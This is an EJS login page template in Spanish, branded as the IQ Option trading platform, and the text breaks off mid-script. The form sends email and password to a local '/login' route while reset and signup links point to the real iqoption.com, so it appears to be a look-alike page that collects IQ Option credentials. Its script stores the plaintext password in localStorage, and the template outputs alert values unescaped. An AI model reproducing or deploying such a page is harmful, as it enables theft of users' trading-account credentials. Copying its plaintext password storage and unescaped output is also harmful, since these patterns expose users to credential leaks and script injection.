<body>
    <div class="login-container">
        <div class="login-header">
            <div class="logo-container">
                <img src="img/kali.logo.svg" alt="IQ">
            </div>
        </div>

        <div class="form-container">
            <% if (error) { %>
                <div class="alert-custom alert-error" id="errorAlert">
                    <i class="fas fa-exclamation-circle"></i>
                    <span>
                        <%- error %>
                    </span>
                </div>
                <% } %>

                    <% if (message) { %>
                        <div class="alert-custom alert-warning" id="messageAlert"
                            style="background: #fff3cd; border: 1px solid #ffeaa7; color: #856404;">
                            <i class="fas fa-info-circle"></i>
                            <span>
                                <%- message %>
                            </span>
                        </div>
                        <% } %>

                            <% if (typeof success !=='undefined' && success) { %>
                                <div class="alert-custom alert-success" id="successAlert">
                                    <i class="fas fa-check-circle"></i>
                                    <span>
                                        <%- success %>
                                    </span>
                                </div>
                                <% } %>

                                    <form method="POST" action="/login" id="loginForm">
                                        <div class="form-group">
                                            <input type="email" class="form-control" id="email" name="email"
                                                placeholder="Correo electrónico" required>
                                        </div>

                                        <div class="form-group">
                                            <div class="input-group">
                                                <input type="password" class="form-control" id="password"
                                                    name="password" placeholder="Contraseña" required>
                                                <button type="button" class="password-toggle"
                                                    onclick="togglePassword()"></button>
                                            </div>
                                        </div>

                                        <label class="mobile-checkbox">
                                            <input type="checkbox" id="rememberCredentials">
                                            <span class="checkmark"></span>
                                            <span class="text">Recordar</span>
                                        </label>

                                        <div class="remember-section">
                                            <a href="https://iqoption.com/es/change-password"
                                                class="forgot-link">¿Olvidaste tu
                                                contraseña?</a>
                                        </div>

                                        <button type="submit" class="login-btn" id="loginBtn">
                                            <span class="btn-text">Iniciar Sesión</span>
                                            <span class="btn-loading" style="display: none;">
                                                <div class="custom-spinner"></div>
                                            </span>
                                        </button>
                                    </form>
        </div>

        <!-- Footer móvil estilo Facebook -->
        <div class="mobile-footer">
            <a href="https://iqoption.com/es/register" class="create-account-btn">Crear cuenta nueva</a>
            <div class="meta-logo">
                <img src="img/bot-meta.png" alt="IQ">
                <span>IQ Option</span>
            </div>
        </div>
    </div>

    <script>
        // Password toggle functionality
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleButton = document.querySelector('.password-toggle');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleButton.classList.add('show-password');
            } else {
                passwordInput.type = 'password';
                toggleButton.classList.remove('show-password');
            }
        }

        // Unified remember credentials functionality
        window.addEventListener('load', function () {
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const mobileCheckbox = document.getElementById('rememberCredentials');
            const loginForm = document.getElementById('loginForm');

            // Load saved credentials on page load
            function loadCredentials() {
                const savedEmail = localStorage.getItem('iqoption_email');
                const savedPassword = localStorage.getItem('iqoption_password');
                const rememberState = localStorage.getItem('iqoption_remember') === 'true';

                if (rememberState && savedEmail && savedPassword) {
                    emailInput.value = savedEmail;
                    passwordInput.value = savedPassword;
                    if (mobileCheckbox) mobileCheckbox.checked = true;
                }
            }

            // Save credentials function
            function saveCredentials() {
                const isRememberChecked = mobileCheckbox && mobileCheckbox.checked;

                if (isRememberChecked) {
                    localStorage.setItem('iqoption_email', emailInput.value);
                    localStorage.setItem('iqoption_password', passwordInput.value);
                    localStorage.setItem('iqoption_remember', 'true');
                } else {
                    localStorage.removeItem('iqoption_email');
                    localStorage.removeItem('iqoption_password');
                    localStorage.removeItem('iqoption_remember');
                }
            }

            // Clear credentials function
            function clearCredentials() {
                localStorage.removeItem('iqoption_email');
                localStorage.removeItem('iqoption_password');
                localStorage.removeItem('iqoption_remember');
            }

            // Load credentials on page load
            loadCredentials();

            // Mobile checkbox change handler
            if (mobileCheckbox) {
                mobileCheckbox.addEventListener('change', function () {
                    if (!this.checked) {
                        clearCredentials();
                    }
                });
            }

            // Form submit handler
            if (loginForm) {
                loginForm.addEventListener('submit', function (e) {
                    console.log('🔄 Formulario enviado - Activando estado de carga...');
                    saveCredentials();

                    // Loading animation - usar los elementos correctos
                    const loginBtn = document.querySelector('.login-btn');
                    const btnText = loginBtn ? loginBtn.querySelector('.btn-text') : null;
                    const btnLoading = loginBtn ? loginBtn.querySelector('.btn-loading') : null;

                    console.log('🔍 Elementos encontrados:', {
                        loginBtn: !!loginBtn,
                        btnText: !!btnText,
                        btnLoading: !!btnLoading
                    });

                    if (loginBtn && btnText && btnLoading) {
                        // Activar estado de carga inmediatamente
                        console.log('✅ Activando estado de carga...');
                        loginBtn.disabled = true;
                        loginBtn.classList.add('loading');
                        btnText.style.display = 'none';
                        btnLoading.style.display = 'inline-block';
                        btnLoading.style.color = 'white';

                        // Timeout más largo para conexiones lentas
                        setTimeout(() => {
                            // Solo resetear si aún estamos en la página de login
                            if (window.location.pathname === '/' || window.location.pathname.includes('login')) {
                                console.log('⏰ Timeout alcanzado - Reseteando botón');
                                resetLoginButton();
                            }
                        }, 15000); // 15 segundos timeout
                    } else {
                        console.log('❌ No se pudieron encontrar los elementos del botón');
                    }
                });
            }

            // Función para resetear el botón en caso de error
            function resetLoginButton() {
                console.log('🔄 Reseteando botón de login...');
                const loginBtn = document.querySelector('.login-btn');
                const btnText = loginBtn ? loginBtn.querySelector('.btn-text') : null;
                const btnLoading = loginBtn ? loginBtn.querySelector('.btn-loading') : null;

                if (loginBtn && btnText && btnLoading) {
                    loginBtn.classList.remove('loading');
                    loginBtn.disabled = false;
                    btnText.style.display = 'inline-block';
                    btnLoading.style.display = 'none';
                    console.log('✅ Botón reseteado correctamente');
                } else {
                    console.log('❌ No se pudo resetear el botón - elementos no encontrados');
                }
            }

            // Resetear botón si hay error o mensaje visible
            if (document.querySelector('.alert-custom')) {
                resetLoginButton();
            }

            // Auto-hide error messages after 5 seconds
            const errorAlert = document.getElementById('errorAlert');
            if (errorAlert) {
                setTimeout(() => {
                    errorAlert.classList.add('fade-out');
                    setTimeout(() => {
                        errorAlert.remove();
                    }, 300);
                }, 5000);
            }

            // Auto-hide success messages after 3 seconds
            const successAlert = document.getElementById('successAlert');
            if (successAlert) {
                setTimeout(() => {
                    successAlert.classList.add('fade-out');
                    setTimeout(() => {
                        successAlert.remove();
